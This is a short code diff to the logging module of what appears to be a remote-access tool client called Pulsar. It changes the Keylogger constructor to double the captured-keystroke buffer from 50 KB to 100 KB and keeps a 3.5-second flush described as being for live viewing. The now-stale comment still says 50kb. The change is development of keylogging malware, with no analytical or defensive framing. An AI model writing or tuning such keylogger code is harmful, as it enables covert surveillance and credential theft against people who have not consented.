@@ -62,7 +62,7 @@ namespace Pulsar.Client.Logging
                 _msgLoop = new ApplicationContext();
 
                 // OPTIMIZED: 3.5-second flush for live viewing + 50kb file size
-                _keylogger = new Keylogger(3500, 50 * 1024);
+                _keylogger = new Keylogger(3500, 100 * 1024);
 
                 _keylogger.Start();
                 _isRunning = true;
